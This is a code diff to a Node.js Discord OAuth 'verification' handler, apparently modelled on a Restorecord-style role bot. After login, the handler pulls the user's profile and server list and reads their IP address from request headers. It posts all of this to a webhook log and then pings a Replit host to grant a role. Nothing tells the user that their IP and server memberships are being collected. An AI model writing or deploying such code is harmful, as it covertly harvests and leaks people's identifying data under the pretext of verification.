@@ -1,4 +1,6 @@
-export default async function handler(req, res) {
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+
+module.exports = async function handler(req, res) {
   const code = req.query.code;
   if (!code) return res.status(400).send("Code not provided");
 
@@ -36,12 +38,11 @@ export default async function handler(req, res) {
 
   const userData = await userResponse.json();
   const guildsData = await guildsResponse.json();
+  const userIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";
 
   const guildList = guildsData.slice(0, 10).map(g => `• ${g.name} (${g.id})`).join("\n") || "None";
 
-  const userIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";
-
-  // Send embed log to webhook
+  // Log to webhook
   await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -58,16 +59,14 @@ export default async function handler(req, res) {
             `IP       : ${userIp}\n\n` +
             `Servers:\n${guildList}` +
             "```",
-          footer: {
-            text: "Restorecord Logs",
-          },
+          footer: { text: "Restorecord Logs" },
           timestamp: new Date().toISOString(),
         },
       ],
     }),
   }).catch(console.error);
 
-  // Call Replit to assign role
+  // Send user ID to Replit bot
   await fetch("https://SilentMinorBase.lokdsnk.repl.co/grant-role", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -75,4 +74,4 @@ export default async function handler(req, res) {
   }).catch(console.error);
 
   res.status(200).send("Verification complete. You can close this tab.");
-}
+};
